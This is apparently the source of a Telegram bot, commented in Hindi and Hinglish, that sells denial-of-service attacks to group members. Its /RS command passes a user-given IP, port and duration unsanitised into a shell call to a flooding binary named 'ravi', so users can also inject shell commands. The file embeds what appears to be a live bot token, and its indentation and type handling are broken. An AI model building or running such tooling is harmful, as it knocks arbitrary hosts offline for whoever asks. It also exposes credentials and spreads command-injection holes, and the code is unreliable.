import telebot
import datetime
import time
import subprocess
import threading

# ✅ TELEGRAM BOT TOKEN
bot = telebot.TeleBot('8111473127:AAGdUoAxw0bvdwtWezRjQ7hMVvKQYT_RO3k')

# ✅ GROUP & CHANNEL SETTINGS
GROUP_ID = "-1002369239894"
SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
ADMINS = ["7129010361"]

# ✅ GLOBAL VARIABLES
active_attacks = {}  # अटैक स्टेटस ट्रैक करेगा
pending_verification = {}  # वेरिफिकेशन के लिए यूजर्स लिस्ट
user_attack_count = {}
MAX_ATTACKS = 2  # (या जो भी लिमिट चाहिए)

# ✅ CHECK IF USER IS IN CHANNEL
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(SCREENSHOT_CHANNEL, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# ✅ HANDLE ATTACK COMMAND
@bot.message_handler(commands=['RS'])
def handle_attack(message):
    user_id = message.from_user.id
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 **YE BOT SIRF GROUP ME CHALEGA!** ❌")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ **PEHLE CHANNEL JOIN KARO!** {SCREENSHOT_CHANNEL}")
        return

    # ✅ पहले पेंडिंग वेरिफिकेशन चेक करो
    if user_id in pending_verification:
        bot.reply_to(message, "🚫 **PEHLE PURANE ATTACK KA SCREENSHOT BHEJ, TABHI NAYA ATTACK LAGEGA!**")
        return

    # ✅ अटैक लिमिट चेक करो
    if user_id not in active_attacks:
         active_attacks[user_id] = []  # Initialize an empty list for the user

   if len(active_attacks[user_id]) >= MAX_ATTACKS:
       bot.reply_to(message, "❌ MAXIMUM 2 ATTACKS ALLOWED AT A TIME! WAIT FOR AN ATTACK TO FINISH.")
       return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ **USAGE:** `/RS <IP> <PORT> <TIME>`")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **PORT AUR TIME NUMBER HONE CHAHIYE!**")
        return

    if time_duration > 120:
        bot.reply_to(message, "🚫 **120S SE ZYADA ALLOWED NAHI HAI!**")
        return

    # ✅ पहले ही वेरिफिकेशन सेट कर दो ताकि यूजर तुरंत स्क्रीनशॉट भेज सके
    pending_verification[user_id] = True

    bot.send_message(
        message.chat.id,
        f"📸 **TURANT SCREENSHOT BHEJ!**\n"
        f"⚠️ **AGAR NAHI DIYA TO NEXT ATTACK BLOCK HO JAYEGA!**",
        parse_mode="Markdown"
    )

    start_time = datetime.datetime.now()
    end_time = start_time + datetime.timedelta(seconds=time_duration)
    active_attacks[user_id] = (target, port, end_time)

    bot.send_message(
        message.chat.id,
        f"🔥 **ATTACK DETAILS** 🔥\n\n"
        f"👤 **USER:** `{user_id}`\n"
        f"🎯 **TARGET:** `{target}`\n"
        f"📍 **PORT:** `{port}`\n"
        f"⏳ **DURATION:** `{time_duration} SECONDS`\n"
        f"🕒 **START TIME:** `{start_time.strftime('%H:%M:%S')}`\n"
        f"🚀 **END TIME:** `{end_time.strftime('%H:%M:%S')}`\n"
        f"📸 **NOTE:** **TURANT SCREENSHOT BHEJO, WARNA NEXT ATTACK BLOCK HO JAYEGA!**\n\n"
        f"⚠️ **ATTACK CHALU HAI! /check KARKE STATUS DEKHO!**",
        parse_mode="Markdown"
    )

    # ✅ Attack Execution Function
    def attack_execution():
        try:
            subprocess.run(f"./ravi {target} {port} {time_duration} 1200", shell=True, check=True, timeout=time_duration)
        except subprocess.CalledProcessError:
            bot.reply_to(message, "❌ **ATTACK FAIL HO GAYA!**")
        finally:
            bot.send_message(
                message.chat.id,
                "✅ **ATTACK KHATAM HO GAYA!** 🎯",
                parse_mode="Markdown"
            )
            del active_attacks[user_id]  # ✅ अटैक खत्म होते ही डेटा क्लियर

    threading.Thread(target=attack_execution).start()

# ✅ SCREENSHOT VERIFICATION SYSTEM
@bot.message_handler(content_types=['photo'])
def verify_screenshot(message):
    user_id = message.from_user.id

    if user_id not in pending_verification:
        bot.reply_to(message, "❌ **TERE KOI PENDING VERIFICATION NAHI HAI! SCREENSHOT FALTU NA BHEJ!**")
        return

    # ✅ SCREENSHOT CHANNEL FORWARD
    file_id = message.photo[-1].file_id
    bot.send_photo(SCREENSHOT_CHANNEL, file_id, caption=f"📸 **VERIFIED SCREENSHOT FROM:** `{user_id}`")

    del pending_verification[user_id]  # ✅ अब यूजर अटैक कर सकता है
    bot.reply_to(message, "✅ **SCREENSHOT VERIFY HO GAYA! AB TU NEXT ATTACK KAR SAKTA HAI!**")

# ✅ ATTACK STATS COMMAND
@bot.message_handler(commands=['check'])
def attack_stats(message):
    user_id = message.from_user.id
    now = datetime.datetime.now()

    for user in list(active_attacks.keys()):
        if isinstance(active_attacks[user], tuple) and len(active_attacks[user]) >= 3:
            if active_attacks[user][2] <= now:
                del active_attacks[user]

    if not active_attacks:
        bot.reply_to(message, "📊 **FILHAAL KOI ACTIVE ATTACK NAHI CHAL RAHA!** ❌")
        return

    stats_message = "📊 **ACTIVE ATTACKS:**\n\n"
    for user, attack_data in active_attacks.items():
        if isinstance(attack_data, tuple) and len(attack_data) >= 3:
            target, port, end_time = attack_data
            remaining_time = (end_time - now).total_seconds()
            stats_message += (
                f"👤 **USER ID:** `{user}`\n"
                f"🎯 **TARGET:** `{target}`\n"
                f"📍 **PORT:** `{port}`\n"
                f"⏳ **ENDS IN:** `{int(remaining_time)}s`\n"
                f"🕒 **END TIME:** `{end_time.strftime('%H:%M:%S')}`\n\n"
            )

    bot.reply_to(message, stats_message, parse_mode="Markdown")

# ✅ ADMIN RESTART COMMAND
@bot.message_handler(commands=['restart'])
def restart_bot(message):
    if message.from_user.id in ADMINS:
        bot.send_message(message.chat.id, "♻️ BOT RESTART HO RAHA HAI...")
        time.sleep(1)
        subprocess.run("python3 m.py", shell=True)
    else:
        bot.reply_to(message, "🚫 SIRF ADMIN HI RESTART KAR SAKTA HAI!")

# ✅ START POLLING
bot.polling(none_stop=True)